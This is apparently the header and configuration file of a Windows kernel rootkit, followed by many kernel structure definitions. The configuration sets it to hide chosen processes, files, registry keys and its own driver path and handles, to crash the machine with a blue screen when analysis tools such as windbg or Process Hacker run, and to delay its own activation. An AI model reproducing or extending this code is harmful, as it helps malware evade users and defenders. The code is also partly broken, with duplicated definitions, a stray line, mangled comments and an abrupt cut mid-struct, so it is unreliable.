#include "includes.hpp"

__forceinline const wchar_t* get_current_file_dir() {
    return L"\\??\\C:\\Windows\\System32\\drivers";
}

//BSOD == BlueScreen
//USER CONFIGURATION HERE:
#define MAX_BSOD_PROCESSES 4 
#define MAX_HIDE_PROCESSES 4
#define MAX_HIDE_FILES     4
#define MAX_HIDE_REGS      4
#define YES 1
#define NO 0
#define MILLISECONDS_TO_100NANOSECONDS(durationMs) ((durationMs) * 1000 * 10)

static const wchar_t* BSODProcesses[MAX_BSOD_PROCESSES] = {
    L"processhacker.exe", L"windbg.exe", NULL, NULL
}; // Processes that when running trigger a BSOD

static volatile LONG bsod = NO; // Enable Blue Screening when Processes from BSODProcesses
static volatile LONG E_HideProcesses = YES; // Enable Process hiding

static const char* HideProcesses[MAX_HIDE_PROCESSES] = {
    "mspaint.exe", "CalculatorApp.exe", NULL, NULL
}; // Processes to hide

static volatile LONG E_HideFiles = YES; // Enable hiding files

static const wchar_t* HideFiles[MAX_HIDE_FILES] = {
    L"C:\\Program Files",
    L"C:\\Users\\wusse\\Desktop\\CheatUI.exe",
    get_current_file_dir(),
    NULL
}; // Files to hide and the Rootkit's path

static volatile LONG E_HideKeys = YES; // Enable hiding Windows registry keys

static const wchar_t* HIDE_REGS[MAX_HIDE_REGS] = {
    L"$$hide", L"WindowsSettingsManager", L"com.microsoft.browsercore", NULL
}; // The keys to hide, windowssettingsmanagr is the rootkit and leave $$hide and NULL

static volatile LONG DebugMode = YES; // Show logs etc if activated 
static volatile LONG DelayExcecution = NO; // Delay the time it actually activates
static volatile LONG64 DelayTime = 7200000000000LL; // Time to delay (100ns units, default = 2 Hours)
static volatile LONG HideHandles = YES; // Hide all handles linked to the driver
//USER CONFIG END;


//NTSTATUS STATUS_NO_MORE_ENTRIES= 0x8000001A;
//NTSTATUS STATUS_SUCCES = 0x00000000;
//CONSOLE DECLARATION HERE:
#ifndef CONSOLE_LOGGER_HPP
#define CONSOLE_LOGGER_HPP

#define log_debug(fmt, ...) do { if (DebugMode) { DbgPrint("[KRK] " fmt "\n", __VA_ARGS__); } } while(0)

/*
enum class msg_type_t : std::uint32_t
{
	LNONE = 0,
	LDEBUG = 9,		blue
	LSUCCESS = 10,	green
	LERROR = 12,	red 
	LWARN = 14		yellow 
};

inline std::ostream& operator<< (std::ostream& os, const msg_type_t type)
{
	switch (type)
	{
	case msg_type_t::LDEBUG:	return os << ".";
	case msg_type_t::LSUCCESS:	return os << "+";
	case msg_type_t::LERROR:	return os << "!";
	case msg_type_t::LWARN:		return os << "*";
	default: return os << "";
	}
}

class logger
{
private:
	std::shared_timed_mutex mutex;

public:
	logger(const std::wstring_view title_name = {})
	{
		AllocConsole();
		AttachConsole(GetCurrentProcessId());

		if (!title_name.empty())
			SetConsoleTitle(title_name.data());

		FILE* conin, * conout;

		freopen_s(&conin, "conin$", "r", stdin);
		freopen_s(&conout, "conout$", "w", stdout);
		freopen_s(&conout, "conout$", "w", stderr);
	}

	~logger()
	{
		const auto handle = FindWindow(L"ConsoleWindowClass", nullptr);
		ShowWindow(handle, SW_HIDE);
		FreeConsole();
	}

	template< typename ... arg >
	void print(const msg_type_t type, const std::string_view& func, const std::string& format, arg ... a)
	{
		static auto* h_console = GetStdHandle(STD_OUTPUT_HANDLE);
		std::unique_lock<decltype(mutex)> lock(mutex);

		const size_t size = (size_t)(1) + std::snprintf(nullptr, 0, format.c_str(), a ...);
		const std::unique_ptr<char[]> buf(new char[size]);
		std::snprintf(buf.get(), size, format.c_str(), a ...);
		const auto formated = std::string(buf.get(), buf.get() + size - 1);

		if (type != msg_type_t::LNONE)
		{
			SetConsoleTextAttribute(h_console, (WORD)(type));
			std::cout << "[";
			std::cout << type;
			std::cout << "] ";

			SetConsoleTextAttribute(h_console, 15  white );
			std::cout << "[ ";

			SetConsoleTextAttribute(h_console, (WORD)(type));
			std::cout << func;

			SetConsoleTextAttribute(h_console, 15 /* white );
			std::cout << " ] ";
		}

		if (type == msg_type_t::LDEBUG)
			SetConsoleTextAttribute(h_console, 8 /* gray );
		else
			SetConsoleTextAttribute(h_console, 15 /* white );

		std::cout << formated << "\n";
	}
};

//#ifdef DebugMode

inline auto g_logger = logger(L"");


#define log_debug(...)   do { if (DebugMode) g_logger.print(msg_type_t::LDEBUG, __FUNCTION__, __VA_ARGS__); } while(0)
#define log_ok(...)      g_logger.print(msg_type_t::LSUCCESS, __FUNCTION__, __VA_ARGS__)
#define log_err(...)     g_logger.print(msg_type_t::LERROR, __FUNCTION__, __VA_ARGS__)
#define log_warn(...)    g_logger.print(msg_type_t::LWARN, __FUNCTION__, __VA_ARGS__)
#define log_raw(...)     g_logger.print(msg_type_t::LNONE, __FUNCTION__, __VA_ARGS__)
//#else
//#define log_debug(...)
//#define log_ok(...)
//#define log_err(...)
//#define log_warn(...)
//#define log_raw(...)
//#endif

#endif // guard
*/




typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_TYPE *POBJECT_TYPE;

typedef struct _ACCESS_STATE {
    // Opaque structure, not usually accessed directly
    char dummy[24];
} ACCESS_STATE, *PACCESS_STATE;

typedef enum _KPROCESSOR_MODE {
    KernelMode,
    UserMode,
    MaximumMode
} KPROCESSOR_MODE;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    };
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

PVOID MmGetSystemRoutineAddress(
  [in] PUNICODE_STRING SystemRoutineName
);

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMemoryPartitionInformation,
    FileStatLxInformation,
    FileCaseSensitiveInformation,
    FileLinkInformationEx,
    FileLinkInformationExBypassAccessCheck,
    FileStorageReserveIdInformation,
    FileCaseSensitiveInformationForceAccessCheck,
    FileMaximumInformation
} FILE_INFORMATION_CLASS;

typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _SINGLE_LIST_ENTRY {
    struct _SINGLE_LIST_ENTRY *Next;
} SINGLE_LIST_ENTRY, *PSINGLE_LIST_ENTRY;

typedef struct _LARGE_INTEGER {
    union {
        struct {
            DWORD LowPart;
            LONG HighPart;
        };
        LONGLONG QuadPart;
    };
} LARGE_INTEGER, *PLARGE_INTEGER;

typedef struct _ULARGE_INTEGER {
    union {
        struct {
            DWORD LowPart;
            DWORD HighPart;
        };
        ULONGLONG QuadPart;
    };
} ULARGE_INTEGER, *PULARGE_INTEGER;

typedef struct _SE_AUDIT_PROCESS_CREATION_INFO {
    PVOID ImageFileName;
} SE_AUDIT_PROCESS_CREATION_INFO, *PSE_AUDIT_PROCESS_CREATION_INFO;


typedef struct _MM_AVL_TABLE *PMM_AVL_TABLE;
typedef struct _EJOB *PEJOB;
typedef struct _EPROCESS_QUOTA_BLOCK _EPROCESS_QUOTA_BLOCK;
typedef struct _PAGEFAULT_HISTORY _PAGEFAULT_HISTORY;
typedef struct _PEB *PPEB;
typedef struct _IO_COUNTERS {
    ULONGLONG ReadOperationCount;
    ULONGLONG WriteOperationCount;
    ULONGLONG OtherOperationCount;
    ULONGLONG ReadTransferCount;
    ULONGLONG WriteTransferCount;
    ULONGLONG OtherTransferCount;
} IO_COUNTERS, *PIO_COUNTERS;
typedef struct _MMSUPPORT MMSUPPORT, *PMMSUPPORT;
typedef struct _ALPC_PROCESS_CONTEXT {
    PVOID PortList;
    PVOID CommunicationInfo;
    ULONG Flags;
} ALPC_PROCESS_CONTEXT, *PALPC_PROCESS_CONTEXT;

typedef struct _HARDWARE_PTE HARDWARE_PTE, *PHARDWARE_PTE;

typedef struct _VM_COUNTERS
{
    SIZE_T PeakVirtualSize;             // The peak virtual address space size of this process, in bytes.
    SIZE_T VirtualSize;                 // The virtual address space size of this process, in bytes.
    ULONG PageFaultCount;               // The number of page faults.
    SIZE_T PeakWorkingSetSize;          // The peak working set size, in bytes.
    SIZE_T WorkingSetSize;              // The current working set size, in bytes
    SIZE_T QuotaPeakPagedPoolUsage;     // The peak paged pool usage, in bytes.
    SIZE_T QuotaPagedPoolUsage;         // The current paged pool usage, in bytes.
    SIZE_T QuotaPeakNonPagedPoolUsage;  // The peak non-paged pool usage, in bytes.
    SIZE_T QuotaNonPagedPoolUsage;      // The current non-paged pool usage, in bytes.
    SIZE_T PagefileUsage;               // The Commit Charge value in bytes for this process. Commit Charge is the total amount of private memory that the memory manager has committed for a running process.
    SIZE_T PeakPagefileUsage;           // The peak value in bytes of the Commit Charge during the lifetime of this process.
} VM_COUNTERS, *PVM_COUNTERS;

typedef enum _KWAIT_REASON
{
	Executive = 0,
	FreePage = 1,
	PageIn = 2,
	PoolAllocation = 3,
	DelayExecution = 4,
	Suspended = 5,
	UserRequest = 6,
	WrExecutive = 7,
	WrFreePage = 8,
	WrPageIn = 9,
	WrPoolAllocation = 10,
	WrDelayExecution = 11,
	WrSuspended = 12,
	WrUserRequest = 13,
	WrEventPair = 14,
	WrQueue = 15,
	WrLpcReceive = 16,
	WrLpcReply = 17,
	WrVirtualMemory = 18,
	WrPageOut = 19,
	WrRendezvous = 20,
	Spare2 = 21,
	Spare3 = 22,
	Spare4 = 23,
	Spare5 = 24,
	WrCalloutStack = 25,
	WrKernel = 26,
	WrResource = 27,
	WrPushLock = 28,
	WrMutex = 29,
	WrQuantumEnd = 30,
	WrDispatchInt = 31,
	WrPreempted = 32,
	WrYieldExecution = 33,
	WrFastMutex = 34,
	WrGuardedMutex = 35,
	WrRundown = 36,
	MaximumWaitReason = 37
} KWAIT_REASON;


typedef LONG       KPRIORITY;

typedef struct _CLIENT_ID {
	DWORD          UniqueProcess;
	DWORD          UniqueThread;
} CLIENT_ID;



typedef struct _SYSTEM_THREAD {



  LARGE_INTEGER           KernelTime;
  LARGE_INTEGER           UserTime;
  LARGE_INTEGER           CreateTime;
  ULONG                   WaitTime;
  PVOID                   StartAddress;
  CLIENT_ID               ClientId;
  KPRIORITY               Priority;
  LONG                    BasePriority;
  ULONG                   ContextSwitchCount;
  ULONG                   State;
  KWAIT_REASON            WaitReason;

} SYSTEM_THREAD, *PSYSTEM_THREAD;


NTSYSAPI NTSTATUS ZwLoadDriver(
  [in] PUNICODE_STRING DriverServiceName
);

NTSYSAPI NTSTATUS ZwUnloadDriver(
  [in] PUNICODE_STRING DriverServiceName
);

typedef struct _SYSTEM_HANDLE
{
	PVOID Object;
	HANDLE UniqueProcessId;
	HANDLE HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
	ULONG_PTR HandleCount;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;


typedef struct _SYSTEM_PROCESS_INFORMATION {



    ULONG                   NextEntryOffset;
    ULONG                   NumberOfThreads;
    LARGE_INTEGER           Reserved[3];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ImageName;
    KPRIORITY               BasePriority;
    HANDLE                  ProcessId;
    HANDLE                  InheritedFromProcessid;
    ULONG                   HandleCount;
    ULONG                   Reserved2[2];
    ULONG                   PrivatePageCount;
    VM_COUNTERS             VirtualMemoryCounters;
    IO_COUNTERS             IoCounters;
    SYSTEM_THREAD           Thread[0];
} SYSTEM_PROCESS_INFORMATION, *PSSYSTEM_PROCESS_INFORMATION;



typedef NTSTATUS(WINAPI* NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);


typedef NTSTATUS (NTAPI* pNtQueryDirectoryFile)(
    HANDLE                 FileHandle,
    HANDLE                 Event,
    PIO_APC_ROUTINE        ApcRoutine,
    PVOID                  ApcContext,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN                ReturnSingleEntry,
    PUNICODE_STRING        FileName,
    BOOLEAN                RestartScan
);

typedef struct _DISPATCHER_HEADER
{
     union
     {
          struct
          {
               UCHAR Type;
               union
               {
                    UCHAR Abandoned;
                    UCHAR Absolute;
                    UCHAR NpxIrql;
                    UCHAR Signalling;
               };
               union
               {
                    UCHAR Size;
                    UCHAR Hand;
               };
               union
               {
                    UCHAR Inserted;
                    UCHAR DebugActive;
                    UCHAR DpcActive;
               };
          };
          LONG Lock;
     };
     LONG SignalState;
     LIST_ENTRY WaitListHead;
} DISPATCHER_HEADER, *PDISPATCHER_HEADER;


typedef struct _KIDTENTRY
{
     WORD Offset;
     WORD Selector;
     WORD Access;
     WORD ExtendedOffset;
} KIDTENTRY, *PKIDTENTRY;


typedef struct _KGDTENTRY
{
     WORD LimitLow;
     WORD BaseLow;
     ULONG HighWord;
} KGDTENTRY, *PKGDTENTRY;

typedef struct _KEXECUTE_OPTIONS
{
     ULONG ExecuteDisable: 1;
     ULONG ExecuteEnable: 1;
     ULONG DisableThunkEmulation: 1;
     ULONG Permanent: 1;
     ULONG ExecuteDispatchEnable: 1;
     ULONG ImageDispatchEnable: 1;
     ULONG Spare: 2;
} KEXECUTE_OPTIONS, *PKEXECUTE_OPTIONS;


typedef struct _KPROCESS
{
     DISPATCHER_HEADER Header;
     LIST_ENTRY ProfileListHead;
     ULONG DirectoryTableBase;
     ULONG Unused0;
     KGDTENTRY LdtDescriptor;
     KIDTENTRY Int21Descriptor;
     WORD IopmOffset;
     UCHAR Iopl;
     UCHAR Unused;
     ULONG ActiveProcessors;
     ULONG KernelTime;
     ULONG UserTime;
     LIST_ENTRY ReadyListHead;
     SINGLE_LIST_ENTRY SwapListEntry;
     PVOID VdmTrapcHandler;
     LIST_ENTRY ThreadListHead;
     ULONG ProcessLock;
     ULONG Affinity;
     union
     {
          ULONG AutoAlignment: 1;
          ULONG DisableBoost: 1;
          ULONG DisableQuantum: 1;
          ULONG ReservedFlags: 29;
          LONG ProcessFlags;
     };
     CHAR BasePriority;
     CHAR QuantumReset;
     UCHAR State;
     UCHAR ThreadSeed;
     UCHAR PowerState;
     UCHAR IdealNode;
     UCHAR Visited;
     union
     {
          KEXECUTE_OPTIONS Flags;
          UCHAR ExecuteOptions;
     };
     ULONG StackCount;
     LIST_ENTRY ProcessListEntry;
     UINT64 CycleTime;
} KPROCESS, *PKPROCESS;

typedef struct _EX_PUSH_LOCK
{
     union
     {
          ULONG Locked: 1;
          ULONG Waiting: 1;
          ULONG Waking: 1;
          ULONG MultipleShared: 1;
          ULONG Shared: 28;
          ULONG Value;
          PVOID Ptr;
     };
} EX_PUSH_LOCK, *PEX_PUSH_LOCK;

typedef struct _KEVENT
{
     DISPATCHER_HEADER Header;
} KEVENT, *PKEVENT;


typedef struct _EX_RUNDOWN_REF
{
     union
     {
          ULONG Count;
          PVOID Ptr;
     };
} EX_RUNDOWN_REF, *PEX_RUNDOWN_REF;

typedef struct _HANDLE_TABLE_ENTRY_INFO
{
     ULONG AuditMask;
} HANDLE_TABLE_ENTRY_INFO, *PHANDLE_TABLE_ENTRY_INFO;

typedef struct _FAST_MUTEX
{
     LONG Count;
     PKTHREAD Owner;
     ULONG Contention;
     KEVENT Gate;
     ULONG OldIrql;
} FAST_MUTEX, *PFAST_MUTEX;

typedef struct _HANDLE_TRACE_DB_ENTRY
{
     CLIENT_ID ClientId;
     PVOID Handle;
     ULONG Type;
     VOID * StackTrace[16];
} HANDLE_TRACE_DB_ENTRY, *PHANDLE_TRACE_DB_ENTRY;


typedef struct _HANDLE_TABLE_ENTRY
{
     union
     {
          PVOID Object;
          ULONG ObAttributes;
          PHANDLE_TABLE_ENTRY_INFO InfoTable;
          ULONG Value;
     };
     union
     {
          ULONG GrantedAccess;
          struct
          {
               WORD GrantedAccessIndex;
               WORD CreatorBackTraceIndex;
          };
          LONG NextFreeTableEntry;
     };
} HANDLE_TABLE_ENTRY, *PHANDLE_TABLE_ENTRY;

typedef struct _HANDLE_TRACE_DEBUG_INFO
{
     LONG RefCount;
     ULONG TableSize;
     ULONG BitMaskFlags;
     FAST_MUTEX CloseCompactionLock;
     ULONG CurrentStackIndex;
     HANDLE_TRACE_DB_ENTRY TraceDb[1];
} HANDLE_TRACE_DEBUG_INFO, *PHANDLE_TRACE_DEBUG_INFO;


typedef struct _HANDLE_TABLE
{
     ULONG TableCode;
     PEPROCESS QuotaProcess;
     PVOID UniqueProcessId;
     EX_PUSH_LOCK HandleLock;
     LIST_ENTRY HandleTableList;
     EX_PUSH_LOCK HandleContentionEvent;
     PHANDLE_TRACE_DEBUG_INFO DebugInfo;
     LONG ExtraInfoPages;
     ULONG Flags;
     ULONG StrictFIFO: 1;
     LONG FirstFreeHandle;
     PHANDLE_TABLE_ENTRY LastFreeHandleEntry;
     LONG HandleCount;
     ULONG NextHandleNeedingPool;
} HANDLE_TABLE, *PHANDLE_TABLE;

typedef struct _EX_FAST_REF
{
     union
     {
          PVOID Object;
          ULONG RefCnt: 3;
          ULONG Value;
     };
} EX_FAST_REF, *PEX_FAST_REF;

typedef struct _KGATE
{
     DISPATCHER_HEADER Header;
} KGATE, *PKGATE;

typedef struct _KAPC_STATE
{
     LIST_ENTRY ApcListHead[2];
     PKPROCESS Process;
     UCHAR KernelApcInProgress;
     UCHAR KernelApcPending;
     UCHAR UserApcPending;
} KAPC_STATE, *PKAPC_STATE;

typedef struct _KWAIT_BLOCK
{
     LIST_ENTRY WaitListEntry;
     PKTHREAD Thread;
     PVOID Object;
     PKWAIT_BLOCK NextWaitBlock;
     WORD WaitKey;
     UCHAR WaitType;
     UCHAR SpareByte;
} KWAIT_BLOCK, *PKWAIT_BLOCK;

typedef struct _KQUEUE
{
     DISPATCHER_HEADER Header;
     LIST_ENTRY EntryListHead;
     ULONG CurrentCount;
     ULONG MaximumCount;
     LIST_ENTRY ThreadListHead;
} KQUEUE, *PKQUEUE;

typedef struct _KDPC
{
     UCHAR Type;
     UCHAR Importance;
     WORD Number;
     LIST_ENTRY DpcListEntry;
     PVOID DeferredRoutine;
     PVOID DeferredContext;
     PVOID SystemArgument1;
     PVOID SystemArgument2;
     PVOID DpcData;
} KDPC, *PKDPC;

typedef struct _KTIMER
{
     DISPATCHER_HEADER Header;
     ULARGE_INTEGER DueTime;
     LIST_ENTRY TimerListEntry;
     PKDPC Dpc;
     LONG Period;
} KTIMER, *PKTIMER;

typedef struct _KTRAP_FRAME
{
     ULONG DbgEbp;
     ULONG DbgEip;
     ULONG DbgArgMark;
     ULONG DbgArgPointer;
     WORD TempSegCs;
     UCHAR Logging;
     UCHAR Reserved;
     ULONG TempEsp;
     ULONG Dr0;
     ULONG Dr1;
     ULONG Dr2;
     ULONG Dr3;
     ULONG Dr6;
     ULONG Dr7;
     ULONG SegGs;
     ULONG SegEs;
     ULONG SegDs;
     ULONG Edx;
     ULONG Ecx;
     ULONG Eax;
     ULONG PreviousPreviousMode;
     PEXCEPTION_REGISTRATION_RECORD ExceptionList;
     ULONG SegFs;
     ULONG Edi;
     ULONG Esi;
     ULONG Ebx;
     ULONG Ebp;
     ULONG ErrCode;
     ULONG Eip;
     ULONG SegCs;
     ULONG EFlags;
     ULONG HardwareEsp;
     ULONG HardwareSegSs;
     ULONG V86Es;
     ULONG V86Ds;
     ULONG V86Fs;
     ULONG V86Gs;
} KTRAP_FRAME, *PKTRAP_FRAME;

typedef struct _KAPC
{
     UCHAR Type;
     UCHAR SpareByte0;
     UCHAR Size;
     UCHAR SpareByte1;
     ULONG SpareLong0;
     PKTHREAD Thread;
     LIST_ENTRY ApcListEntry;
     PVOID KernelRoutine;
     PVOID RundownRoutine;
     PVOID NormalRoutine;
     PVOID NormalContext;
     PVOID SystemArgument1;
     PVOID SystemArgument2;
     CHAR ApcStateIndex;
     CHAR ApcMode;
     UCHAR Inserted;
} KAPC, *PKAPC;

typedef enum _POOL_TYPE
{
         NonPagedPool = 0,
         PagedPool = 1,
         NonPagedPoolMustSucceed = 2,
         DontUseThisType = 3,
         NonPagedPoolCacheAligned = 4,
         PagedPoolCacheAligned = 5,
         NonPagedPoolCacheAlignedMustS = 6,
         MaxPoolType = 7,
         NonPagedPoolSession = 32,
         PagedPoolSession = 33,
         NonPagedPoolMustSucceedSession = 34,
         DontUseThisTypeSession = 35,
         NonPagedPoolCacheAlignedSession = 36,
         PagedPoolCacheAlignedSession = 37,
         NonPagedPoolCacheAlignedMustSSession = 38
} POOL_TYPE;


typedef struct _DESCRIPTOR
{
     WORD Pad;
     WORD Limit;
     ULONG Base;
} DESCRIPTOR, *PDESCRIPTOR;

typedef struct _KSPECIAL_REGISTERS
{
     ULONG Cr0;
     ULONG Cr2;
     ULONG Cr3;
     ULONG Cr4;
     ULONG KernelDr0;
     ULONG KernelDr1;
     ULONG KernelDr2;
     ULONG KernelDr3;
     ULONG KernelDr6;
     ULONG KernelDr7;
     DESCRIPTOR Gdtr;
     DESCRIPTOR Idtr;
     WORD Tr;
     WORD Ldtr;
     ULONG Reserved[6];
} KSPECIAL_REGISTERS, *PKSPECIAL_REGISTERS;

typedef enum _SYSTEM_INFORMATION_CLASS
{
     SystemInformationClassMin = 0,
    	SystemBasicInformation = 0,
    	SystemProcessorInformation = 1,
    	SystemPerformanceInformation = 2,
    	SystemTimeOfDayInformation = 3,
    	SystemPathInformation = 4,
    	SystemNotImplemented1 = 4,
    	SystemProcessInformation = 5,
    	SystemProcessesAndThreadsInformation = 5,
    	SystemCallCountInfoInformation = 6,
    	SystemCallCounts = 6,
    	SystemDeviceInformation = 7,
    	SystemConfigurationInformation = 7,
    	SystemProcessorPerformanceInformation = 8,
    	SystemProcessorTimes = 8,
    	SystemFlagsInformation = 9,
    	SystemGlobalFlag = 9,
    	SystemCallTimeInformation = 10,
    	SystemNotImplemented2 = 10,
    	SystemModuleInformation = 11,
    	SystemLocksInformation = 12,
    	SystemLockInformation = 12,
    	SystemStackTraceInformation = 13,
    	SystemNotImplemented3 = 13,
    	SystemPagedPoolInformation = 14,
    	SystemNotImplemented4 = 14,
    	SystemNonPagedPoolInformation = 15,
    	SystemNotImplemented5 = 15,
    	SystemHandleInformation = 16,
    	SystemObjectInformation = 17,
    	SystemPageFileInformation = 18,
    	SystemPagefileInformation = 18,
    	SystemVdmInstemulInformation = 19,
    	SystemInstructionEmulationCounts = 19,
    	SystemVdmBopInformation = 20,
    	SystemInvalidInfoClass1 = 20,
    	SystemFileCacheInformation = 21,
    	SystemCacheInformation = 21,
    	SystemPoolTagInformation = 22,
    	SystemInterruptInformation = 23,
    	SystemProcessorStatistics = 23,
    	SystemDpcBehaviourInformation = 24,
    	SystemDpcInformation = 24,
    	SystemFullMemoryInformation = 25,
    	SystemNotImplemented6 = 25,
    	SystemLoadImage = 26,
    	SystemUnloadImage = 27,
    	SystemTimeAdjustmentInformation = 28,
    	SystemTimeAdjustment = 28,
    	SystemSummaryMemoryInformation = 29,
    	SystemNotImplemented7 = 29,
    	SystemNextEventIdInformation = 30,
    	SystemNotImplemented8 = 30,
    	SystemEventIdsInformation = 31,
    	SystemNotImplemented9 = 31,
    	SystemCrashDumpInformation = 32,
    	SystemExceptionInformation = 33,
    	SystemCrashDumpStateInformation = 34,
    	SystemKernelDebuggerInformation = 35,
    	SystemContextSwitchInformation = 36,
    	SystemRegistryQuotaInformation = 37,
    	SystemLoadAndCallImage = 38,
    	SystemPrioritySeparation = 39,
    	SystemPlugPlayBusInformation = 40,
    	SystemNotImplemented10 = 40,
    	SystemDockInformation = 41,
    	SystemNotImplemented11 = 41,
    	SystemInvalidInfoClass2 = 42,
    	SystemProcessorSpeedInformation = 43,
    	SystemInvalidInfoClass3 = 43,
    	SystemCurrentTimeZoneInformation = 44,
    	SystemTimeZoneInformation = 44,
    	SystemLookasideInformation = 45,
    	SystemSetTimeSlipEvent = 46,
    	SystemCreateSession = 47,
    	SystemDeleteSession = 48,
    	SystemInvalidInfoClass4 = 49,
    	SystemRangeStartInformation = 50,
    	SystemVerifierInformation = 51,
    	SystemAddVerifier = 52,
    	SystemSessionProcessesInformation = 53,
    	SystemInformationClassMax
} SYSTEM_INFORMATION_CLASS;
typedef struct _SYSTEM_THREAD_INFORMATION {
    	LARGE_INTEGER KernelTime;
    	LARGE_INTEGER UserTime;
    	LARGE_INTEGER CreateTime;
    	ULONG WaitTime;
    	PVOID StartAddress;
    	CLIENT_ID ClientId;
    	KPRIORITY Priority;
    	LONG BasePriority;
    	ULONG ContextSwitches;
    	ULONG ThreadState;
    	KWAIT_REASON WaitReason;
} SYSTEM_THREAD_INFORMATION, *PSYSTEM_THREAD_INFORMATION;
typedef struct _SYSTEM_PROCESS_INFORMATION {
    	ULONG NextEntryOffset;
    	ULONG NumberOfThreads;
    	LARGE_INTEGER WorkingSetPrivateSize;
    	ULONG HardFaultCount;
    	ULONG NumberOfThreadsHighWatermark;
    	ULONGLONG CycleTime;
    	LARGE_INTEGER CreateTime;
    	LARGE_INTEGER UserTime;
    	LARGE_INTEGER KernelTime;
    	UNICODE_STRING ImageName;
    	KPRIORITY BasePriority;
    	HANDLE UniqueProcessId;
    	HANDLE InheritedFromUniqueProcessId;
    	ULONG HandleCount;
    	ULONG SessionId;
    	ULONG_PTR UniqueProcessKey;
    	SIZE_T PeakVirtualSize;
    	SIZE_T VirtualSize;
    	ULONG PageFaultCount;
    	SIZE_T PeakWorkingSetSize;
    	SIZE_T WorkingSetSize;
    	SIZE_T QuotaPeakPagedPoolUsage;
    	SIZE_T QuotaPagedPoolUsage;
    	SIZE_T QuotaPeakNonPagedPoolUsage;
    	SIZE_T QuotaNonPagedPoolUsage;
    	SIZE_T PagefileUsage;
    	SIZE_T PeakPagefileUsage;
    	SIZE_T PrivatePageCount;
    	LARGE_INTEGER ReadOperationCount;
    	LARGE_INTEGER WriteOperationCount;
    	LARGE_INTEGER OtherOperationCount;
    	LARGE_INTEGER ReadTransferCount;
    	LARGE_INTEGER WriteTransferCount;
    	LARGE_INTEGER OtherTransferCount;
    	SYSTEM_THREAD_INFORMATION Threads[1];
} SYSTEM_PROCESS_INFORMATION, * PSYSTEM_PROCESS_INFORMATION;
     
extern "C"
{
     NTSTATUS ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS systemInformationClass, PVOID systemInformation, ULONG systemInformationLength, PULONG returnLength);
}

Function:

typedef struct _GENERAL_LOOKASIDE
{
     union
     {
          SLIST_HEADER ListHead;
          SINGLE_LIST_ENTRY SingleListHead;
     };
     WORD Depth;
     WORD MaximumDepth;
     ULONG TotalAllocates;
     union
     {
          ULONG AllocateMisses;
          ULONG AllocateHits;
     };
     ULONG TotalFrees;
     union
     {
          ULONG FreeMisses;
          ULONG FreeHits;
     };
     POOL_TYPE Type;
     ULONG Tag;
     ULONG Size;
     union
     {
          PVOID * AllocateEx;
          PVOID * Allocate;
     };
     union
     {
          PVOID FreeEx;
          PVOID Free;
     };
     LIST_ENTRY ListEntry;
     ULONG LastTotalAllocates;
     union
     {
          ULONG LastAllocateMisses;
          ULONG LastAllocateHits;
     };
     ULONG Future[2];
} GENERAL_LOOKASIDE, *PGENERAL_LOOKASIDE;

typedef struct _PP_LOOKASIDE_LIST
{
     PGENERAL_LOOKASIDE P;
     PGENERAL_LOOKASIDE L;
} PP_LOOKASIDE_LIST, *PPP_LOOKASIDE_LIST;

typedef struct _KSPIN_LOCK_QUEUE
{
